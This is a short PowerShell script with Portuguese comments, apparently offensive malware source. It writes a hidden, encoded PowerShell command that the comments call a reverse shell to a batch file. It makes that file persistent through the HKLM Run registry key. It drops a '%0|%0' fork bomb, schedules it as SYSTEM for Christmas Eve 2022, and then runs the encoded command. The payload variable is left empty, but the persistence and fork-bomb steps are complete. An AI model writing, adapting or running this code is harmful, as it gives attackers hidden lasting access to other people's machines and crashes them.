# Salva o comando de shell reversa em uma variavel
$cmd = ""
# Salva a shell reversa e define a pesistencia atraves do registry
echo "powershell -W hidden -e $cmd" | out-file -encoding ascii C:\Windows\Temp\payload.bat
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\Temp\payload.bat"
# Baixa o fork bomb e define para executar na noite de natal
echo "%0|%0" | out-file -encoding ascii C:\Windows\Temp\bomb.bat
schtasks /create /RU "system" /sc once /sd 24/12/2022 /st 22:45 /tr C:\Windows\Temp\bomb.bat /rl highest /tn "bomb"
# Invoca a shell reversa
powershell -e $cmd
